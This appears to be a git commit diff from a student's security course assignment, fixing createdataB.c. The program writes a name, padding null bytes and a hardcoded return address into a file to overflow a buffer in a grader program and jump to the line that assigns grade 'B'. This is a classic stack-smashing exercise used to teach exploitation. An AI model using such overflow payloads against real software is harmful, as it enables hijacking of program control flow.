9712e407d961cee3523a5fd0451361cd60ec1328
chimwemwe <cc9970@princeton.edu>
2022-12-13 22:24:12 -0500

    hopefully fixed errors

--- createdataB.c
+++ createdataB.c
@@ -9,7 +9,9 @@
 #include <sys/mman.h>
 
 
-/* What does main do?*/
+/* Takes in no input and write Chimwemwe followed by 39 null bytes
+ * to file dataB and then the adress of the instruction [grade = 'B']
+ * in grader.c */
 int main(void) {
     FILE *psFile;
     int i = 0;
@@ -18,23 +20,22 @@ int main(void) {
     psFile = fopen("dataB", "w");
 
     /* Write my name (Chimwemwe) to the file dataB */
-    fprintf("Chimwemwe");
+    fprintf(psFile, "Chimwemwe");
 
     /* Write 39 null bytes to dataB (one terminating name string */ 
     /* and (38 to fill up the remaining cells in buf array) */
     for (; i < 39; i++) {
-        // Write the null bytes as binary data
+        /* Write the null bytes as binary data */ 
         putc(0x00, psFile);
     }
 
-    // Write the unsigned long address of grade = 'B' (0x400858)
+    /* Write the unsigned long address of grade = 'B' (0x400858) */
     putc(0x58, psFile);
     putc(0x08, psFile);
     putc(0x40, psFile);
 
-    // Close the file
+    /* Close the file */
     fclose(psFile);
 
-
-
+    return 0;
 }
